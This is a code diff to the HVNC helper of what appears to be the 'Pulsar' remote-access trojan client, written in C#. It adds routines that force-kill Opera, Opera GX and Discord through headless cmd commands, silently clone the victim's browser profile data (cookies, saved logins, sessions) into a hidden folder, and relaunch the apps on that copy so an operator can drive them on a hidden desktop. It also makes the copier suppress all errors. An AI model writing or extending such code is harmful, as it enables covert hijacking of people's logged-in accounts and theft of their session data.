@@ -1,9 +1,12 @@
 ﻿using Microsoft.Win32;
 using System;
+using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Threading.Tasks;
 
 namespace Pulsar.Client.Helper.HVNC
 {
@@ -19,31 +22,36 @@ namespace Pulsar.Client.Helper.HVNC
 
         private void CloneDirectory(string sourceDir, string destinationDir)
         {
-            DirectoryInfo directoryInfo = new DirectoryInfo(sourceDir);
-            if (!directoryInfo.Exists)
+            if (!Directory.Exists(sourceDir))
             {
-                throw new DirectoryNotFoundException("Source directory '" + sourceDir + "' does not exist.");
+                throw new DirectoryNotFoundException($"Source directory '{sourceDir}' not found.");
             }
-            if (!Directory.Exists(destinationDir))
+
+            Directory.CreateDirectory(destinationDir);
+
+            var directories = Directory.GetDirectories(sourceDir, "*", SearchOption.AllDirectories);
+            var files = Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories);
+
+            foreach (var dir in directories)
             {
-                Directory.CreateDirectory(destinationDir);
-            }
-            foreach (FileInfo fileInfo in directoryInfo.GetFiles())
-            {
-                string destFileName = Path.Combine(destinationDir, fileInfo.Name);
                 try
                 {
-                    fileInfo.CopyTo(destFileName, false);
+                    string targetDir = dir.Replace(sourceDir, destinationDir);
+                    Directory.CreateDirectory(targetDir);
                 }
-                catch (IOException ex)
-                {
-                    Console.WriteLine("Could not copy file '" + fileInfo.FullName + "': " + ex.Message);
-                }
+                catch (Exception) { }
             }
-            foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
+
+            foreach (var file in files)
             {
-                string destinationDir2 = Path.Combine(destinationDir, directoryInfo2.Name);
-                this.CloneDirectory(directoryInfo2.FullName, destinationDir2);
+                try
+                {
+                    string targetFile = file.Replace(sourceDir, destinationDir);
+                    File.Copy(file, targetFile, true);
+                }
+                catch (UnauthorizedAccessException) { }
+                catch (IOException) { }
+                catch (Exception) { }
             }
         }
 
@@ -59,13 +67,13 @@ namespace Pulsar.Client.Helper.HVNC
                 }
                 else
                 {
-                    Console.WriteLine("Folder does not exist.");
+                    Debug.WriteLine("Folder does not exist.");
                     result = false;
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Error deleting folder: " + ex.Message);
+                Debug.WriteLine("Error deleting folder: " + ex.Message);
                 result = false;
             }
             return result;
@@ -122,6 +130,7 @@ namespace Pulsar.Client.Helper.HVNC
             this.CreateProc(filePath2);
         }
 
+
         public void StartBrave()
         {
             string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\";
@@ -159,7 +168,48 @@ namespace Pulsar.Client.Helper.HVNC
 
         public void StartOpera()
         {
-            //soon
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\";
+            if (!Directory.Exists(path)) return;
+
+            string sourceDir = path;
+            string secureFolder = Path.Combine(Path.GetDirectoryName(path), "SecureFolder");
+            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";
+
+            this.CreateProc(killCommand);
+
+            if (Directory.Exists(secureFolder))
+            {
+                DeleteFolder(secureFolder);
+            }
+
+            Directory.CreateDirectory(secureFolder);
+            this.CloneDirectory(sourceDir, secureFolder);
+
+            string startCommand = "Conhost --headless cmd.exe /c start opera.exe --user-data-dir=\"" + secureFolder + "\"";
+            this.CreateProc(startCommand);
+        }
+
+        public void StartOperaGX()
+        {
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\";
+            if (!Directory.Exists(path)) return;
+
+            string sourceDir = path;
+            string secureFolder = Path.Combine(Path.GetDirectoryName(path), "SecureFolder");
+            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F";
+
+            this.CreateProc(killCommand);
+
+            if (Directory.Exists(secureFolder))
+            {
+                DeleteFolder(secureFolder);
+            }
+
+            Directory.CreateDirectory(secureFolder);
+            this.CloneDirectory(sourceDir, secureFolder);
+
+            string startCommand = "Conhost --headless cmd.exe /c start operagx.exe --user-data-dir=\"" + secureFolder + "\"";
+            this.CreateProc(startCommand);
         }
 
         public void StartEdge()
@@ -229,6 +279,19 @@ namespace Pulsar.Client.Helper.HVNC
                 return;
             }
             return;
+        }
+
+
+        public void StartDiscord()
+        {
+            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Update.exe";
+            if (!File.Exists(discordPath)) return;
+
+            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM discord.exe /F";
+            this.CreateProc(killCommand);
+
+            string startCommand = "\"" + discordPath + "\" --processStart Discord.exe";
+            this.CreateProc(startCommand);
         }
 
         public void StartExplorer()
